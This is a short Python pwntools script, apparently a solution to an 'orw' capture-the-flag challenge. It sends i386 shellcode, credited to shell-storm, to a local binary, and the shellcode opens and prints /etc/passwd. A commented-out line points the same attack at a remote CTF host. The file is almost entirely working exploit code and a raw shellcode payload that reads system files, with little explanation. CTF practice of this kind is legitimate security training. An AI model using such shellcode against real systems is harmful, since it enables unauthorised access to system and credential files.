#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

# p = remote("ctf.racterub.me", 3002)
p = process("./orw")
p.recvuntil(":")
context.arch = "i386"

# fd = open("/home/orw/flag",0)
# size = read(fd,buf,0x40)
# write(1,buf,size)
# exit()

# Ref: http://shell-storm.org/shellcode/files/shellcode-73.php
shellcode =  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
shellcode += "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
shellcode += "\x80\x89\xc6\xeb\x06\xb0\x01\x31"
shellcode += "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
shellcode += "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
shellcode += "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
shellcode += "\x04\xb3\x01\xb2\x01\xcd\x80\x83"
shellcode += "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
shellcode += "\xff"
shellcode += "/etc/passwd"

p.sendline(shellcode)

